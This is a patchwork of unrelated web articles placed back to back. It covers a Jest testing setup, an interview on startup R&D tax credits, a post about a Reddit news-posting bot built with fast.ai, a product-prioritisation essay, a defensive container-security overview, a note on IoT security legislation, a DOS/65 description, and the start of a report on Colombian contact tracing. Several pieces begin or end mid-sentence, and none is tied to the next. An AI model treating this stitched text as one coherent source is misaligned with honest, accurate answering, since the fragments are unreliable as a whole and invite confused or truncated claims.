    <span>"test-all"</span>: <span>"yarn lint &amp;&amp; yarn type-check &amp;&amp; yarn test"</span>
  },
}</code></pre>
<p>Next, create a new file <code>test/testUtils.ts</code>:</p>
<pre><code>

<span>import</span> { RenderOptions, RenderResult, render } <span>from</span> <span>'@testing-library/react'</span>

<span>const</span> customRender = (ui: React.ReactElement, options: RenderOptions = {}): <span><span>RenderResult</span> =&gt;</span> render(ui, { ...options })


<span>export</span> * <span>from</span> <span>'@testing-library/react'</span>


<span>export</span> { customRender <span>as</span> render }</code></pre>
<p>Add the first basic test by creating another file <code>test/pages/index.test.tsx</code>:</p>
<pre><code>

<span>import</span> IndexPage <span>from</span> <span>'pages/index'</span>
<span>import</span> { render } <span>from</span> <span>'../testUtils'</span>

describe(<span>'Index page'</span>, <span><span>()</span> =&gt;</span> {
  it(<span>'matches snapshot'</span>, <span><span>()</span> =&gt;</span> {
    <span>const</span> { asFragment } = render(&lt;IndexPage /&gt;, {})
    expect(asFragment()).toMatchSnapshot()
  })
})</code></pre>
<p>Add a file <code>jest.config.js</code> to complete the Jest setup:</p>
<pre><code>

<span>module</span>.exports = {
  <span>roots</span>: [<span>'&lt;rootDir&gt;'</span>],
  <span>moduleFileExtensions</span>: [<span>'ts'</span>, <span>'tsx'</span>, <span>'js'</span>, <span>'json'</span>, <span>'jsx'</span>],
  <span>testPathIgnorePatterns</span>: [<span>'&lt;rootDir&gt;[/\\\\](node_modules|.next)[/\\\\]'</span>],
  <span>transformIgnorePatterns</span>: [<span>'[/\\\\]node_modules[/\\\\].+\\.(ts|tsx)$'</span>],
  <span>transform</span>: {
    <span>'^.+\\.(ts|tsx)$'</span>: <span>'babel-jest'</span>,
  },
  <span>moduleNameMapper</span>: {
    <span>'\\.(css|less|sass|scss)$'</span>: <span>'identity-obj-proxy'</span>,
  },
}</code></pre>
<p>To support absolute imports, add the following to the Jest config:</p>
<pre><code>

<span>module</span>.exports = {
  <span>moduleDirectories</span>: [<span>'node_modules'</span>, <span>'src'</span>],
}</code></pre>
<p>Make sure that everything works by running:</p>
<pre><code>yarn <span>test</span>-all</code></pre>

<p>That's it! Hopefully I managed to demystify how to setup a new web project just a little bit. Your preferred setup might differ slightly but you should still be able to jump into the section that interests you.

<p><em>This week, we spoke with <a href="https://www.linkedin.com/in/bgincentax/" rel="nofollow noopener" target="_blank">Brian Goodwin</a> about R&amp;D tax credits and what they mean for startups. Goodwin is the Director of Sales and Partnerships at <a href="https://incentaxllc.com/">Incentax</a>, a tax credit consulting firm focused on these tax credits for businesses. <a href="https://www.wsj.com/articles/quibi-weighs-shutting-down-as-problems-mount-11603301946">Quibi has pulled the plugged</a></em></p>

<p><strong>What is the R&amp;D tax credit and how does it apply to my company?</strong></p>
<p>The Research and Experimentation (R&amp;D) Tax Credit has been around for over 30 years and aims to promote innovation and&nbsp;jobs within the United States.&nbsp;Traditionally, this credit has been used by larger profitable companies looking to eliminate their overall tax burden, since it is applied dollar for dollar against income tax liabilities. A great example of this is <a data-cke-saved-href="https://itep.org/between-the-lines-amazon-q2-reports-hints-it-will-avoid-taxes-on-this-years-record-profit-haul/" href="https://itep.org/between-the-lines-amazon-q2-reports-hints-it-will-avoid-taxes-on-this-years-record-profit-haul/">Amazon, who reduced their federal tax bill to nearly zero</a>.&nbsp;</p>
<p>Startups innovate at a very high level, but until the recent <a data-cke-saved-href="https://www.investopedia.com/terms/p/path-act.asp" href="https://www.investopedia.com/terms/p/path-act.asp">PATH Act</a>, they were unable to take advantage of the program. Now early-stage businesses with qualifying expenses can put the credits toward the employer share of Social Security payroll taxes, thereby freeing up cash flow.</p>

<p><strong>What makes a startup eligible for the early-stage R&amp;D tax credit?</strong></p>
<p>Companies just need qualifying R&amp;D activities and expenses. These can differ by industry, but here are a few quick items we look for at a high level:</p>
<ul>
<li>Does the company create or improve a new product process or technology?&nbsp;</li>
<li>Do employees have scientific-based roles (e.g. engineer, mathematician, developer, etc.)?</li>
<li>Was there a level of uncertainty in the process?</li>
</ul>

<p>Startups are eligible for up to $250k per year in credits on R&amp;D-related payroll taxes (~6.2% of wages)&nbsp;if they:</p>
<ul>
<li>Have a total of less than 5 years total of revenue (or gross receipts)</li>
<li>Have less than $5 million in revenue in the current open year (greater revenue in prior years is allowed)&nbsp;</li>
</ul>

<p>One thing to note:&nbsp;income tax credits (if available) must be applied before payroll tax credits. For instance, if a&nbsp;company gets $100k in R&amp;D credits while having an income tax liability of $25k, the credit would be applied to eliminate that first. The remaining $75k would be applied to payroll taxes in the early-stage provision.</p>

<p><strong>Why don’t more companies know about this? Is this different from other typical business deductions?</strong></p>
<p>Companies often focus on deductions rather than credits in order to reduce the amount paid on taxes. With a deduction, you are reducing taxable income, which decreases the amount owed in taxes, whereas a credit is a dollar-for-dollar cancellation of tax liability. Credits tend to provide more bang for the buck.</p>
<p>Example:&nbsp;A person with an income of $200,000 is taxed at 32% and pays $64,000 in taxes.&nbsp;</p>
<ul>
<li>DEDUCTION: A deduction of $60,000 leaves $140,000 of income. Potentially taxed at a lower rate of 24%, the tax bill would be $33,600.</li>
<li>TAX CREDIT: If instead the person received a tax credit of $60,000, they still have a tax bill of $64,000 on the $200,000 of income. With the dollar for dollar tax credit, the final tax bill would be $4,000.</li>
</ul>

<p>The R&amp;D tax credit is mainly underutilized because businesses, particularly early-stage ones,&nbsp; think they won’t qualify for it. Unfortunately, very few conversations are being had to change that, because tax firms tend to focus on larger business. That leaves a big knowledge gap in which early-stage companies and their advisors aren’t given enough resources to understand the potential of this credit. They are missing out on cash flow that can be reinvested in the business, all generated from expenses they’ve already incurred.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>

<p><strong>What are some examples of companies using the credits?</strong></p>
<p>On the early-stage side, we’re working with a biotech company with 25 employees (including 5 engineers involved in R&amp;D) and roughly $125K in annual revenue. They qualified for $105K in Social Security tax credits. Another small startup developing a mental health app just did the same, freeing up additional capital to reinvest into clinical trials key to their development.</p>
<p>On the income tax credit side, we currently are working with a 45-employee company that manufacturers packaging equipment. They’ve been in business for over 20 years but have never taken the credit. With a multi-year study, they’re eligible to apply over $600K in credits towards current and future tax liabilities.&nbsp;</p>

<p><strong>Can these credits ever be applied retroactively?</strong></p>
<p>The payroll tax application of the R&amp;D credit is only good for the open year/current year.&nbsp; However, the income tax application of the credit can be claimed retroactively, up to three years back for the federal credit. Most states also have a state R&amp;D tax credit, with the rules and lookback periods varying by state. (California, for example, has a lookback of four years.)</p>
<p>Outside of that window, income tax credits can be carried forward up to 20 years and applied to income taxes at a future date, as seen in the manufacturing company example earlier.&nbsp;</p>

<p><strong>Are there any risks in using R&amp;D tax credits?&nbsp;</strong></p>
<p>The main risk is working with someone who either doesn’t have your best interest in mind (they may over-inflate the credit) or doesn’t specialize in the R&amp;D tax credit (they may not get the calculations correct).&nbsp;&nbsp;&nbsp;&nbsp;</p>

<p><strong>If I think my company may qualify, what do I do next?</strong></p>
<p>Speak with either a CPA or a tax credit consulting firm, like Incentax, and learn more about your individual situation.</p>

<p><strong>Any recommendations for finding a qualified CPA with R&amp;D tax credit experience?&nbsp;</strong></p>
<p>Smaller CPA firms are not likely to offer R&amp;D tax credit services because it is very specialized. Ask your firm if they offer it all, and then whether it’s in-house or through a third party. Incentax works with CPA firms in these exact cases, providing expertise and advice on an as-needed basis.&nbsp;</p>

<p>Back in 2006-2007 my friend and I put together a spreadsheet of 20 or so high-level achievements called “Everything’s a Contest”. This included goals like “Photograph a live grizzly bear in the wild”, “Have something named after you”, and <em>“Get 10,000 (post) karma on Reddit”</em>. Despite our heated discussions about what should be on this list and the criteria for success none of us ever really did anything substantial to complete any of these goals. In early 2020 I decided to tackle one of these long-standing contests. <em>But I was going to do it with AI since I wanted to see how I could apply AI to more of my problems</em>. I’m a huge fan of <a href="https://www.fast.ai/">fast.ai</a> and I appreciate its high-level abstractions and simple interfaces. For someone trying to get into deep learning, I would highly recommend it and the associated courses. This is a post about how I built a bot to gain karma on Reddit with fast.ai.</p>
<h2 id="approach">Approach</h2>
<p>Content on Reddit, in general, falls into two categories which you might call original content and found content. Trying to automate generating original content to post would be implementing something like <a href="https://imgflip.com/ai-meme">imgflip’s AI meme generator</a> and posting the resulting content to r/memes. While the memes that are generated are an amusing juxtaposition of tropes, they generally aren’t as good as memes that are generated by human users skilled in the art of observational comedy. Try the meme generator out and you’ll see what I mean. At some point, I did try posting one of those just to see how well it did.</p>
<figure>
    <img src="https://www.a8b.io/images/reddit/3migr03n6m251.jpg#mid" alt="Drake meme with text Staying in the Server / Watching Anime">
    <figcaption>I went through about 100 auto generated memes before I got this. This post got ~35 points with the title 'An AI generated this meme. Good to know it's putting its sentience to good use.'</figcaption>
  </figure>

<p>The other approach would be finding content online and posting it. I chose this route for automation because while generating high-quality content is more interesting it’s also far more challenging and involved. Rather than being disadvantaged in trying to catch up to the “human quality” of content, a computer is at the advantage since the primary differentiator between posters is the ability to search through large amounts of content and speed (who finds and posts something first). In particular, I ended up looking at news based subreddits due to a few reasons:</p>
<ul>
<li>Little chances of content being a repost</li>
<li>Lots of content being generated frequently</li>
<li>Large member bases</li>
<li>A lot of the content comes from the same set of known sites</li>
</ul>
<figure>

    <figcaption>Domains for all the &gt; 1 score articles from /r/business in the last week as of October 29th 2020, showing the top few sites supply the majority of content.</figcaption>
  </figure>

<p>Why use AI at all though? If I was going to automate posting why not just create a bot that submits all links and leaves it up to the masses to sort my fate. In general, spamming on Reddit is looked down upon, though I believe banning is up to the discretion of the subreddit moderators. While in theory I might have gotten away with it or used some sort of generic rate-limiting and hope for the best, I wanted my bot to be more like a productive member of the community submitting thoughtful content, an extension of myself, rather than a spam bot that would be the bane of its existence until forcibly removed.</p>
<p>I searched for and found many good news subreddits but I targeted initially /r/business and /r/worldnews, somewhat arbitrarily and somewhat because those areas seemed interesting to me. /r/business had a sizeable community (577k members) and relatively low frequency of posts for a news subreddit so it seemed approachable as a first target. I would build a web crawler to watch popular business news sites for new articles, and then leverage an NLP-based article classifier to determine if the article had a high chance of receiving upvotes.</p>
<h2 id="implementation">Implementation</h2>
<h3 id="finding-and-loading-posts">Finding and loading posts</h3>
<p>To train the NLP model that will classify articles I need the article text and their corresponding Reddit scores. Unfortunately, the official Reddit API limits the amount of historic post data you can retrieve to 1000 items. Luckily there is an alternative, you can grab historic post data from <a href="https://pushshift.io/">pushshift.io</a> using code I shamelessly adapted from <a href="https://www.osrsbox.com/blog/2019/03/18/watercooler-scraping-an-entire-subreddit-2007scape/">WaterCooler: Scraping an Entire Subreddit (/r/2007scape)</a>. The output file of the script has individual lines like the one below, containing a JSON object of a post per line:</p>
<pre><code>{"author": "CALIPHATEMEDIA", "author_flair_css_class": null, "author_flair_text": null, "brand_safe": true, "can_mod_post": false, "contest_mode": false, "created_utc": 1514767344, "domain": "caliphatemedia.info", "full_link": "https://www.reddit.com/r/business/comments/7nc5yf/south_korea_to_regulate_bitcoin_trading_further/", "id": "7nc5yf", "is_crosspostable": false, "is_reddit_media_domain": false, "is_self": false, "is_video": false, "locked": false, "num_comments": 0, "num_crossposts": 0, "over_18": false, "parent_whitelist_status": "all_ads", "permalink": "/r/business/comments/7nc5yf/south_korea_to_regulate_bitcoin_trading_further/", "pinned": false, "retrieved_on": 1514841750, "score": 1, "selftext": "", "spoiler": false, "stickied": false, "subreddit": "business", "subreddit_id": "t5_2qgzg", "subreddit_type": "public", "thumbnail": "default", "thumbnail_height": 140, "thumbnail_width": 140, "title": "South korea to regulate bitcoin trading further with tougher measures", "url": "http://www.caliphatemedia.info/2017/12/south-korea-govt-to-introduce-tougher.html", "whitelist_status": "all_ads"}
</code></pre><p>After generating a file with all the historic posts, I loaded the contents referenced by the “url” field of each JSON line into <a href="https://github.com/slaveofcode/boilerpipe3">boilerpipe3</a> which is a python library that simplifies HTML documents into their primary content text.</p>
<figure>
    <img src="https://www.a8b.io/images/reddit/reuters_article.jpg" alt="">
    <figcaption>boilerpipe3 simplifies this (mostly) down to what we really want which is 'By Jeffrey Dastin, Akanksha Rana 4 Min Read (Reuters) - Amazon.com INC AMZN.O on Thursday...'</figcaption>
  </figure>

<p>After loading the article text I did some processing to remove pages that didn’t load properly and to truncate page text to 10k characters at most.</p>
<h3 id="training-the-model">Training the model</h3>
<p>I trained the NLP model for /r/business over a few days on approximately 271k articles from 2018-01-01 to mid-April 2020. I used an <a href="https://docs.fast.ai/text.models.awdlstm">AWD_LSTM</a> (e.g. <code>language_model_learner(data_lm, AWD_LSTM, drop_mult=0.3)</code> and <code>text_classifier_learner(data, AWD_LSTM, drop_mult=0.5)</code>) for the model with discrete labels based on the article score: neutral (0-10 points), okay (10-100), good (100-500), and great (500+). The classes are kind of arbitrary and I’ve changed them around for different iterations and subreddits. The only thing I ended up paying attention to at runtime was the non-neutral class score, so this could have been a binary classifier or even better a classifier that looks at an individual article as a candidate for multiple subreddits rather than training an individual model per subreddit. For world news I had around double the number of articles. In either case I trained in 100k article chunks due to memory limitations, reloading the existing model and tuning with the new data each time.</p>

<h3 id="building-the-bot">Building the bot</h3>
<p>I chose a few sites (Business Insider, Reuters, Bloomberg, CNN, CNBC, BBC, etc.) based on frequent sites for /r/business and put them into a script and built a crawler using requests and BeautifulSoup. Every minute or so I’d crawl the site root for new links and process the linked page with boilerpipe and pass it through the NLP model for scoring. New pages with a non-neutral score of greater than 0.25 (an arbitrary threshold I picked for this particular model) would be flagged and emailed to me using AWS SNS. Initially, I relied on filtering these incoming suggestions and submitting the articles myself using the Reddit app.</p>
<figure>
    <img src="https://www.a8b.io/images/reddit/example_email.png" alt="">
    <figcaption>An example email I received from my site poller that I called 'Reddit Postmaster'.</figcaption>
  </figure>

<h2 id="automation">Automation</h2>
<p>My site poller is acting as a personal news aggregator that I use to generate suggestions for things to post. To remove me from this loop there are a few “last mile” problems to solve. Coding up submitting via the Reddit API is easy enough, but I don’t just submit all the articles that get passed to me, I act as a quality filter choosing not to submit things which don’t seem appropriate. I also gather an appropriate title for the Reddit post. The page title is usually not good as a post title (for example containing redundancies like the site name) directly and needs to be reformatted or the title should instead be extracted from the content for example by picking the most appropriate h1 tag on the page. Rather than refining the model to be better at classifying articles and improve the accuracy of the scoring mechanism, and then coding a new component for extracting the title, I decided to try to encapsulate these tasks into a mechanical turk task and have humans as the final gate-keeper and title generator. I can take the results from these mechanical turk tasks and submit the articles to Reddit via the Reddit API utilizing those results.</p>
<h3 id="mechanical-turk">Mechanical Turk</h3>
<p>Mechanical turk is a service for leveraging humans to complete small tasks for your application. It’s great for augmenting AI applications and collecting data via labeling tasks for them. But using it effectively isn’t without difficulties. The important thing to know about mechanical turk is that many workers on the platform are (sensibly) optimizing for task completion quantity. When using a custom qualifier for tasks, ensure the qualification you’re looking for is not apparent from the question. Similarily a bad HIT (human intelligence task) would be one where you ask the user to read an article and check some box if they think it belongs in some category. For example, I did this with /r/worldnews candidates to ensure that among other things didn’t pertain to US news, however the first fully automated submission I made to /r/worldnews was “Johnson &amp; Johnson to stop selling baby powder in the United States” which was …</p></article></div>

	<p>One of the best tricks I’ve come across to make meaningful progress on any long term project is to start with an initial (typically long) time estimate, than play the “What Can We Do In X” game.</p>

<p>If you need a fancy mnemonic, use: WCWDIX (pronounced wick-widicks)</p>

<p>It works like this:</p>

<p>If you start with an initial, hypothetical estimate to build a product or feature of 5 months, ask yourself and your team: “What can we do in 1 month?”</p>

<h3>One Month</h3>

<p>This forces the thought process of <strong><em>Ruthless Prioritization</em></strong>.  Typically, your must have features become should-haves and your should-haves become nice-to-haves. It’s important to be ruthless here.  Strip the business down to the core, while still being usefull.  Remember that the MVP of a car is not 4 tires on the ground (useless) but a skateboard or bike.</p>

<h3>One Week</h3>

<p>Follow that up with “What can we do in 1 week?”</p>

<p>This helps with the notion of what it takes to make a <strong><em>Useful Prototype</em></strong>.  Hopefully this is mostly code/product that you can reuse over the longer journey.  Importantly, you have prioritized faster and are cutting corners to get to a product point where you can put it in front of people.  This builds technical debt, but it is almost always worth it because you are learning so much faster, earlier in the development process.</p>

<h3>One day</h3>

<p>By now, you know what comes next: “What can we do in a day?”</p>

<p>In a day, you can’t build much.  But you can <strong><em>Fake Product</em></strong>.  Sometimes this means wireframes in a mockup app.  Sometimes this means wiring together no-code SAAS apps or even a spreadsheet and tools like Zapier to simulate the guts of your business logic.  Fake Product is great for customer development or even early sales calls.</p>

<p>Another option is <strong><em>Market Discovery</em></strong>:  spend a day doing market research.  This is different from customer validation which typically happens after you have a product idea or prototype.  Market discovery is more about finding a market that has pain points and the ability to pay to address those pain points, and ideally a market you can reach via known sales/marketing strategies.  It’s important to do this process without any preconceived notions of product/solutions.  Identify the pain first!</p>

<h3>One Hour</h3>

<p>“What can we do in an hour?”</p>

<p>Not much?  Wrong!  An hour is enough for <strong><em>Short Burst of Research</em></strong>.  You can hold 2-3 customer development calls.  You can setup up a landing page and blast LinkedIn, twitter and other social media sites to see if you can get any bites.  You can do some google searches and look for evidence of your market hypothesis.  You won’t typically get enough info here to be data, more anecdotes.  But it might be enough to guide early thoughts/directions or help quickly identify a potential pivot that requires more investigation.</p>

<h3>Ten minutes</h3>

<p>Lastly “What can we do in 10 minutes?”</p>

<p>Even ten minutes is enough for <strong><em>Quick Info Wins</em></strong>.   This is kind of a mini versino of Short Burst of Research.  Send off a couple emails.  You can buy a small ad campaign and measure how many clicks it gets over time.  Counts cohorts in LinkedIn (are you marketing to poele in X profession?  go check out how many people are in that profession to get a sense of scale).  Anything you can do or setup to get Information from Outside your Team is great use of early hours on a project.</p>

<h3>Wrapping it up</h3>

<p>As you play the WCWDIX game, each step forces you to reduce “Time to Learn” by an order of magnitude. You can hopefully shine light as early as possible on the fact that you may be building the wrong product or solution.</p>

<p>The suggested activities (Fake Product, Market Discovery, etc…) are just examples.  If you have alternative ideas that roughly fit in the respective timeframes, go for it!</p>

<p>However, the output of each step must make your smarter in some way.  You could spend a few hours setting up a CI/CD system or learning about a new javascript framework. That’s work, and you have made technical progress, but you’ve <strong>learned nothing</strong> about your product, it’s viability in the market, or your ability to sell into a market.  The bulk of your technical progress should (ideally) be after you’ve proven market and channel viability.</p>

<p>Companies don’t usually fail because they can’t build a product.  They usually fail because they build the wrong product at the wrong time or they build the solution that ends up being wrong for a market that can’t or won’t bear the appropriate costs.</p>

<p>Always make sure to the best of your ability that you are building the right product!</p>

        <div>
            <p>Securing containers is a complex task.  The problem space is broad, vendors are on fire, there are tons of checklists and best practices and it’s hard to prioritize solutions. So if you had to <strong>implement a container security strategy</strong> where would you start?</p>

<p>I suggest to start from the basics: understanding <strong>what container security is about</strong> and build a model to navigate risks.</p>

<h2 id="follow-the-devops-life-cycle">Follow the DevOps Life Cycle</h2>

<p>Every security initiative is eventually constrained by where security controls can be implemented, so I find practical to just follow the standard DevOps life cycle to <em>surface patterns™</em> and <em>unlock synergies™</em>.</p>

<p>The DevOps Lifecycle is an infinite iteration of:</p>

<ul>
<li>Plan</li>
<li>Code</li>
<li>Build</li>
<li>Test</li>
<li>Release</li>
<li>Deploy</li>
<li>Operate</li>
<li>Monitor</li>
</ul>

<p><img src="https://cloudberry.engineering/devops-lifecycle.jpg" alt="DevOps Lifecycle - source: ryadel.com"></p>

<p>Containers are included in the application in the form of a Dockerfiles but are not really part of it. As such they don’t interest the planning and coding phase.</p>

<p><em>(no, writing Dockerfiles is not coding.)</em></p>

<p>Every other step is in scope from a security point of view, and I would group them like this:</p>

<ul>
<li><strong>Build Time</strong>: build, test and release.</li>
<li><strong>Container Infrastructure</strong>: deploy and operate.</li>
<li><strong>Runtime</strong>: monitor.</li>
</ul>

<p>Why? Every security strategy is only effective if it can be implemented. And every step in each group share a common facility where security controls can be injected without adding much friction:</p>

<ul>
<li>Build Time: The CI/CD infrastructure, the container registry</li>
<li>Container Infrastructure: the container orchestrator</li>
<li>Runtime: the production environment</li>
</ul>

<p>Now we have three macro areas we can use as a starting point to do our risk assessments.</p>

<h2 id="security-at-build-time">Security at Build Time</h2>

<p>At build time we have in input a bunch of source files and a Dockerfile, and we get as output a Docker image.</p>

<p>This is where most vendors tend to cluster while trying to sell you the narrative of the importance of scanning container images and calling it a day.  Container security scanning is important, yes, but it’s not enough.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>minimize the risk of supply chain attacks.</li>
</ul>
</div>


<h3 id="container-images-hygiene">Container Images Hygiene</h3>

<p>First, decide how your images should look like, with a focus on how software dependencies are introduced:</p>

<ul>
<li>what base images are developers allowed to use?</li>
<li>are software dependencies pinned? From where are they pulled?</li>
<li>are there any labels that are needed to simplify governance and compliance?</li>
<li>lint the Dockerfile</li>
<li>follow <a href="https://cloudberry.engineering/article/dockerfile-security-best-practices/">Dockerfile security best practices</a></li>
</ul>

<p>All of these checks are static and can be implemented for cheap as a step in the build pipelines.</p>

<h3 id="container-images-scanning">Container Images Scanning</h3>

<p>Then we can move into scanning the container image.</p>

<p><strong>Do not scan the image as a step in the build pipeline</strong>, instead setup continuous scanning in the container registry.</p>

<p>Why? Vulnerabilities are continuously discovered while your services are not necessarily continuously built. Secondly, builds are additive: every build will generate a new image. So, assuming  your container orchestrator trust your registry, every tag you publish can always be deployed and need to be assessed.</p>

<p><em>(It’s also very slow to scan at build time)</em></p>

<p>This is where you start thinking about defining <strong>patch management</strong> and <strong>shelf life</strong> processes:</p>

<ul>
<li>patch management: results from the scanning will feed a patching process that will result in a new version of the image</li>
<li>shelf life: unpatched/old/unsafe images are deleted from the registry</li>
</ul>

<p><em>(next article will be about how to choose a container scanning solution, if you are facing the dilemma right now feel free to <a href="mailto:hello@clouberry.engineering">ping me</a>)</em></p>

<h2 id="container-infrastructure-security">Container Infrastructure Security</h2>

<p>The container infrastructure is comprised of all the moving parts that are in charge of pulling your images from the registry and run them as containers in production.</p>

<p>It’s mostly going to be the container orchestrator – <em>*cough* kubernetes *cough*</em>.</p>


<div>
<p><strong>This stage goals</strong>:</p>

<ul>
<li>Avoid platform misconfigurations with security implications</li>
<li>Minimize the <strong>breadth</strong> of an attack from a compromised container</li>
</ul>
</div>


<h3 id="security-of-the-infrastructure-misconfigurations">Security OF the Infrastructure: Misconfigurations</h3>

<p>Container orchestrators are complex, Kubernetes in particular. As of now they fail the promise of DevOps and I think we are still an abstraction layer (or two) away from being a mainstream solution without too much operational overhead.</p>

<p>Every complex platforms is prone to be misconfigured, and this is the part you want to focus on.</p>

<p>You have to threat model your infrastructure to <strong>ensure it can’t be abused</strong>.
This particular thread model should focus on every actor but a compromised container (we will cover that next).</p>

<p>I can’t go into details here, because it really depends on what you are running. For Kubernetes a good starting point for threat modelling is <a href="https://www.marcolancini.it/2020/blog-kubernetes-threat-modelling/">this</a>.</p>

<p>Additionally, if you are not doing it yet, this is also a <strong>good argument in favour of using a managed platform</strong>: the complexity is reduced if you can leverage a shared responsibility model with your (trusted) provider.</p>

<h3 id="security-in-the-infrastructure-lateral-movements">Security IN the infrastructure: Lateral Movements</h3>

<p>Next we can talk about what happens when a container is compromised.</p>

<p>You want to minimize the <a href="https://cloudberry.engineering/article/lateral-movement-cloud/">attacker’s ability to move laterally</a>, focusing on these two layers:</p>

<ul>
<li>The network layer</li>
<li>The Identity and Access management (IAM) layer</li>
</ul>

<p><strong>The network should not be flat</strong>. You can start by brutally segment everything into subnetworks and work your way up to a full fledge service meshes.</p>

<p>On the IAM layer work your way toward having a <strong>single identity for each container</strong> in order to fine tune the authorization grants. This is particularly important in multi tenant platforms: without granular identities it’s impossible to achieve least privilege.</p>

<p><em>(Google Kubernetes Engine (GKE) has a nifty feature for this called <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a>)</em></p>

<p>Finally, since they are supposed to be immutable, a wonderful strategy would be to <strong>reduce the amount of time containers can run</strong>: the window of opportunity for attackers to move laterally and gain persistence is as long as the container running lifetime. Continously shut down and spin up your containers.</p>

<p>And this final consideration allow me to smoothly move into the next area.</p>

<h2 id="runtime-security">Runtime Security</h2>

<p>The last piece of the puzzle is the security of your running workloads.
At this point most of the hardening is done and here is when we move into the realm of reactive security controls, the grim land of <strong>post-fail</strong>.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>is to minimize the <strong>impact</strong> of an attack from a compromised container.</li>
</ul>
</div>


<h3 id="detection-and-incident-response">Detection and Incident Response</h3>

<p>The best way to control the impact of an attack is to minimize the time between the breach to when the security team is alerted.</p>

<p>Detecting an ongoing breach is another area where vendors are scrambling to find a silver bullet. There are many approaches, most of them will require side cars and/or daemon sets actively monitoring pod’s traffic and system calls.</p>

<p>Most solutions will provide some value but my advice is to start simple and iterate: use your existing SIEM, ingest your platform, application and audit logs.</p>

<p><strong>Incidents will happen</strong>, and it’s fine: have an incident response process.</p>

<p>The first bullet point of every post-mortem should be: <em>“how can we detect this quicker next time?”</em> answering will allow you to identify your blind spots, which you can then use to understand what signals you are missing and what makes sense to buy.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Container security is a broad problem and it is not just about scanning images.</p>

<p>This is the model I built and used to reason about container risks and solutions. It’s very high level and of course, as with every model, <strong>it’s not necessarily the right one</strong>.</p>

<p>We all know that in reality each infrastructure is a snowflake: so start with your own threat model and use this one <strong>as an inspiration</strong>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>

              
    <div>
      
            
      <p>Recently, the House of Representatives in the United States passed the <a href="https://www.ssa.gov/legislation/legis_bulletin_092220.html" target="_blank">IoT Cybersecurity Improvement Act of 2020</a>. This is a landmark bill whose goal is to improve the security of IoT devices. Given the bi-partisan support for the bill, it is likely to pass the Senate and soon be put into action. This represents a powerful win for everyone who truly cares about security as we enter an increasingly digital world where the virtual command controls the physical space.</p>
<p><strong>What is this regulation?</strong></p>
<p>In short, this bill will require IoT device vendors to comply with a basic minimum set of security measures. These security measurements include things like vulnerability scanning and security patching, not using hard-coded passwords, and so on. If you want all the details on this new regulation, please check out the legislation pages on Congress.gov <a href="https://www.congress.gov/bill/116th-congress/house-bill/1668?q=%7B%22search%22%3A%5B%22H.R.%2B1668%22%5D%7D&amp;s=1&amp;r=1%3Ftarget%3D_blank">here</a>.</p>
<p>Once enacted, the US Federal government will only be allowed to purchase IoT devices from vendors that comply with this regulation. This means that unless a vendor can prove that it complies with the security measures, the US Federal Government is prohibited from purchasing from them. </p>
<p>The stakes have been raised for vendors as security compliance requirements to participate in the market have just been increased dramatically.</p>
<p><strong>Why is this good news?</strong></p>
<p>There are too many IoT vendors in the market today who are not serious enough in their attitude to address security concerns. These are often vendors with shiny websites and rock-bottom pricing, but who have a complete lack of understanding the very serious security needs of the market at hand. Highly insecure and fragile internet connected devices are being pushed into the market on a massive scale. Thankfully, this new regulation will put an end to much of this, or at least so in the US public sector.</p>
<p>Fortunately, there are vendors like <a href="https://mender.io/">Mender</a>, who take security as their prime directive and put you in an enviable position of being able to win more contracts, as you will have a distinct competitive advantage over others who would have to add security measures so playing catch up to you, or else find other marketplaces. </p>
<p>Mender users care inherently about the security of their IOT devices. This valiant and noble attitude has now become a competitive advantage to win deals with the US Federal Government, which is one of the largest purchasers in the world.</p>
<p>Finally, it is the hope that the purchasing power of the US Federal Government is so strong that it will positively impact the private market and buyers as well. </p>
<p>We are moving in the right direction, and the sooner you can ensure proper security measures on connected devices you provide to the market, the better prepared you will be for the future.</p>

                            <p><i>From the system description of DOS/65:</i><br>
"What I (Richard A. Leary) have done is attack the software side of the problem in order to make any 6502 system a truly workable disk based system. In addition a degree of compatibility is now possible not only between 6502 systems but with large parts of the world of CP/M systems. The result of my efforts is a system of software which I have named DOS/65."</p>
                            <p>Richard's implementation is intially made for S-100 based systems, but he began to port it to the&nbsp;C64 also (see below).</p>
                            <p>DOS/65 has a lot of CP/M&nbsp;look-alike commands for the command line and also some applications like BASIC-E included.</p>
                            <p>Of course some differences between CP/M-80 and DOS/65 exist - the lowest memory areas (e.g. the "zero page") are not usable for the TPA, so the usable system memory area starts at a higher address (e.g. $0400).</p>

<p>As if being in lockdown wasn’t grim enough, Claudia Moreno saw a creepy ad while scrolling her Instagram one night last May. In red, black, and yellow, adorned with the Bogotá mayor office’s logo, the graphic warned: “Due to your location, you were likely in contact with people who have COVID.” Moreno tapped it, out of curiosity and hoping that it would stop showing up in her feed. “They were too flashy and unnerving,” she said.</p>

<p>Thousands of <a href="https://drive.google.com/file/d/1Rx_UsYUUuvMLSZzr8bHhyFdbWLuB7TNe/view?usp=sharing%20https://drive.google.com/file/d/1Rx_UsYUUuvMLSZzr8bHhyFdbWLuB7TNe/view?usp=sharing">Colombians have seen</a> similar ads on their phones, because in the capital Bogotá and in the department of Antioquia, health officials are using mobile data in their Covid-19 contact tracing efforts. But rather than relying on dedicated apps that require active downloads, Colombian authorities are using digital advertising data present in people’s phones — without first asking their permission. While activists say this is a privacy breach, authorities claim the action is justified<strong> </strong>because it helps in contact tracing and makes sure patients are identified and get treatment.</p>



<p>Bogotá did not only run geotargeted ads on Facebook and Instagram in the neighborhoods it deemed more at risk; officials also used the data to understand how the virus was moving within city limits and how residents were socially isolating. Bogotá health authorities declined an interview request from <em>Rest of World</em> to explain their contact-tracing initiative further.</p>



<p>Antioquia also leveraged the technology behind mobile ads to locate sick individuals in the capital Medellín and the rest of the region. “We wanted to be more proactive in identifying where infected people are,” said Juan Carlos Quiceno, spokesperson for the state’s ad-tech contact tracing initiative. </p>



<p>Both governments contracted local company Servinformación, which promised contact-tracing capabilities using regular mobile ad tech to “track individuals inside an area the government would like to monitor as well as to see how the virus propagates,” says Emiliano Isaza, a data scientist for the company.</p>



